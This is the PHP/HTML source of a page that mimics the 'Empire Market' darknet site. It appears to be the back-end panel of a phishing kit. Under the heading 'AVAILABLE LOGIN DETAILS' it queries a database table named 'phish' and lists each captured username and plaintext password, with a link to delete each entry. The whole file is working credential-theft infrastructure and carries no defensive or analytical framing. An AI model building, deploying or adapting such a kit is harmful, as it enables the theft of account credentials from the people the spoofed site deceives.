 <!DOCTYPE html>
 <html>
 <head>
  <title>Empire Market</title>
  <link rel="stylesheet" type="text/css" href="style.css"/>
  <link rel="stylesheet" href="font-awesome.min.css"/>
  <link rel="stylesheet" href="css/all.css">
  <link rel="stylesheet" href="css/bootstrap.min.css">
  <link rel="icon" href="favicon.png" type="image/png"/>





</head>
<body>

  <a href="index.php"><img style="padding-bottom: 10px;padding-top: 10px;" src="logo.png"></a>
  <div class="body-content">
    <div class="nav">
      <ul>
        <li><a href="index.php">LOGIN</a></li>
        <li><a href="register.php">REGISTER</a></li>
        <li><a href="http://tpo7v66snknyugsf.onion" target="_blank">FORUMS</a></li>
        <li><a href="safe_haven.php">VERIFY MIRROR</a></li>
      </ul>
    </div>
    
    <div class="body-content">

   



     



      <div class="wrapper">

        <div class="login-page">
          <div class="login-Head">
            <div class="loginHead-logo">
              <i class="fas fa-sign-in-alt" aria-hidden="true"></i> 
            </div>                     

            <div class="loginHead-head">
              <h3>AVAILABLE LOGIN DETAILS</h3>
            </div>
          </div>





          <div class="clear"></div>

          <div class="login-textbox">

           <table class="table table-striped">
            <thead>
              <tr>
                <th>Username</th>
                <th>Password</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
             <?php
             include 'conn.php';
// Check connection
             if (!$link) {
              die("Connection failed: " . mysqli_connect_error());
            }

            $sql = "SELECT * FROM phish";
            $result = mysqli_query($link, $sql);

            if (mysqli_num_rows($result) > 0) {
    // output data of each row
              while($row = mysqli_fetch_assoc($result)) {?>

                <tr>
                  <td><?php echo $row["username"] ?></td>
                  <td>$ <?php echo $row["password"] ?></td>

                  <td><a class="btn btn-danger" href="delete_track.php?id=<?php echo $row["user_id"]; ?>">
                    <i class="glyphicon glyphicon-trash icon-white"></i>
                    Delete
                  </a>

                </td>
              </tr>



              <?php 

            }
          } else {
            echo "0 results";
          }

          mysqli_close($link);
          ?>
        </tbody>
      </table>                



    </div>
  </div>
</div>


<!--</div> -->


</div>



</div>
<div class="footer">
  <p><font size="1">

    <span style="float:right;">
    Server time: Wednesday, Feb 12, 2020 02:46:21 </span>
    

    <span style="float:left;">Copyright &copy; 2020 Empire Market </span> </font><br/>

  </p>
  
</div>
